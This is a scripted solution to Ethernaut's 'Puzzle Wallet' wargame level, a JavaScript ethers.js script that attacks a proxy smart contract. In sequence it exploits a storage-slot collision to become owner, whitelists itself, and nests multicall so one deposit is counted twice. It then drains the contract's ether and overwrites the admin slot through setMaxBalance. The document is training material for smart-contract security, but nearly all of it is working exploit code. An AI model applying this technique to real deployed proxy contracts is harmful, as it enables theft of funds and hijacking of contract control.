# 24 - Puzzle Wallet

### Scripted Solution

```javascript
const fs = require('fs')
const ethers = require('ethers')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { playerWalletSigner, contract: puzzleProxyContract } = await setup(
    'PuzzleProxy'
  )

  // Call `proposeNewAdmin` on `PuzzleProxy`
  const proposeNewAdminTx = await puzzleProxyContract.proposeNewAdmin(
    playerWalletSigner.address
  )
  await proposeNewAdminTx.wait(1)

  // Call `addToWhitelist` with player address
  const addToWhitelistTx = await puzzleProxyContract.addToWhitelist(
    playerWalletSigner.address
  )
  await addToWhitelistTx.wait(1)

  // Call `multicall` with two calls to `multicall` that each in turn call `deposit`
  const encodedDepositFunctionData =
    puzzleProxyContract.interface.encodeFunctionData('deposit', [], {
      value: ethers.utils.parseEther('0.001')
    })
  const encodedMulticallToDeposit =
    puzzleProxyContract.interface.encodeFunctionData(
      'multicall',
      [[encodedDepositFunctionData]],
      {
        value: ethers.utils.parseEther('0.001')
      }
    )

  const multicallTx = await puzzleProxyContract.multicall(
    [encodedMulticallToDeposit, encodedMulticallToDeposit],
    {
      value: ethers.utils.parseEther('0.001')
    }
  )
  await multicallTx.wait(1)

  // Call `execute` to drain contract balance
  const executeTx = await puzzleProxyContract.execute(
    playerWalletSigner.address,
    ethers.utils.parseEther('0.002'),
    '0x0000000000000000000000000000000000000000',
    {
      gasLimit: 10000000,
      gasPrice: 100000000000
    }
  )
  await executeTx.wait(1)

  // Use `setMaxBalance` to set `admin` to player address
  const setMaxBalanceTx = await puzzleProxyContract.setMaxBalance(
    playerWalletSigner.address
  )
  await setMaxBalanceTx.wait(1)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
